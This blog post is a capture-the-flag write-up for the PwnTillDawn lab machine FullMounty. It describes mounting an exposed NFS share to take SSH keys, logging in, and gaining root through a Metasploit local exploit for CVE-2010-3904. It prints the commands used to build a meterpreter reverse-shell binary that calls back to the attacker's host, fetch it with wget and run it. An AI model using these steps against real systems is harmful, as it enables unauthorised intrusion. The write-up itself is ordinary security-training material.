---
layout: post
title: PwnTillDawn - FullMounty Write-Up
date: 2024-07-11
classes: wide
description: Pwning an NFS share and using privilege escalation techniques to gain root access.
---

# FullMounty (10.150.150.134)

![](/assets/img/post/pwntilldawn_fullmounty/1.png)

## Network Scanning

The target machine uses Linux and has a total of 3 flags. We'll start by scanning the machine as usual.

```
sudo nmap -sV -sC 10.150.150.134 -oN nmap.txt
```

![](/assets/img/post/pwntilldawn_fullmounty/2.png)

We have some interesting results including ports `111`, `2049` and `8089`. Personally, I don't always check for SSH unless I really feel there's something useful on it, as most of the time it's a dead end.



## Exploring NFS Share

NFS is a protocol that is used to share files between different hosts and, when misconfigured, can be used to upload malicious files and even root machines. Let's list this share to see what's inside.

```
showmount -e 10.150.150.134
```

![](/assets/img/post/pwntilldawn_fullmounty/3.png)

There's only one share available on `/srv/exportnfs`, which we can try to mount on our machine. For this we'll create a new folder, and use `mount` to access the contents of the share.

```
mkdir nfs
sudo mount -t nfs -o vers=3,nolock 10.150.150.134:/srv/exportnfs ./nfs
```

We can access the share and list it's contents using `ls -la`, it's important to **always** use the `-a` flag as you can easily miss hidden files without it.

![](/assets/img/post/pwntilldawn_fullmounty/4.png)

After copying the files, don't forget to `sudo umount` the folder.



## Connecting Through SSH

We've achieved the first flag that's inside the `FLAG49`, together with SSH key files. We can't really use a key without a user, can we? Fortunately for us `id_rsa.pub` file contains a username that we can use.

![](/assets/img/post/pwntilldawn_fullmounty/5.png)

We can now try to SSH into the machine using this key. This step really took me a long time to figure out as the machine uses a legacy SSH version, which requires some special flags in order to perform a successful connection.

```
sudo ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -oHostKeyAlgorithms=+ssh-rsa -i id_rsa deadbeef@10.150.150.134
```

![](/assets/img/post/pwntilldawn_fullmounty/6.png)

Soon after connecting to the target machine, we can list out the files and discover the next 2 flags in the same folder, but only one of them is readable by our current user which is `FLAG50`, the other one requires root privileges.



## Privilege Escalation

This step is quite tricky, as due to how old the machine is, there's a couple of different methods, some are easier than others. We can use [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) to find out different methods. The more obvious being Dirty Cow, this can be seen by verifying the kernel and OS version.

![](/assets/img/post/pwntilldawn_fullmounty/7.png)

The real problem is that the machine doesn't have a compiler installed, so you'll have to compile the exploit externally and upload it to the target, which wouldn't be a problem if wasn't for the fact that it requires the same OS version, and nobody even remember that Ubuntu 10.04 even existed, neither there's a docker container available. The alternative is to use Metasploit modules which is simpler, so we'll stick to that.

If you decide to use `linux-exploit-suggester`, you've probably seen that CVE-2010-3904 is listed as a highly probable exploit.

![](/assets/img/post/pwntilldawn_fullmounty/8.png)

By Googling it, we can see Metasploit has a module for this vulnerability, which we can use easily, and it also tells us that the exploit has been tested on Ubuntu 10.04 with the exact same kernel version we're working on, that's great!

![](/assets/img/post/pwntilldawn_fullmounty/9.png)

As this is a local exploit, we'll use `msfvenom` to create our meterpreter reverse shell and before uploading it to the target machine.

```
sudo msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.66.66.230 lport=1337 -f elf -o reverse
```

![](/assets/img/post/pwntilldawn_fullmounty/10.png)

Luckily we have access to `wget` in the target machine, so we'll be using python to transfer the binary with the command `python -m http.server` and use it to transfer the malicious binary.

```
wget -o- http://10.66.66.230:8000/reverse
```

![](/assets/img/post/pwntilldawn_fullmounty/11.png)

Now, back to our machine, we'll start Metasploit and use the `multi/handler` module to listen for connections from our previous uploaded binary.

```
sudo msfconsole
```

![](/assets/img/post/pwntilldawn_fullmounty/12.png)

Now let's go back to the target machine and run our binary.

```
chmod +x reverse
./reverse
```

![](/assets/img/post/pwntilldawn_fullmounty/13.png)

Now, I know how tempting is to explore the new openly shell, but we'll just `bg` so this session will be sent to the background, as we'll run our privilege escalation exploit.

![](/assets/img/post/pwntilldawn_fullmounty/14.png)

And now we just run the exploit and profit!

![](/assets/img/post/pwntilldawn_fullmounty/15.png)

I've used this method because I really think it's faster than creating a VM with the specific OS version and compiling the exploit by hand. Besides, Metasploit can do the heavy lifting for us, no need to reinvent the wheel.

![](/assets/img/post/pwntilldawn_fullmounty/16.png)

After typing `shell`, just use `/bin/bash -i` for an interactive shell and print out the `FLAG51` file, voilá!

I really had fun playing this challenge, it taught me how to adapt, as understanding sometimes things won't go so smoothly as expected, it's important to understand how different tools can be used for the same job.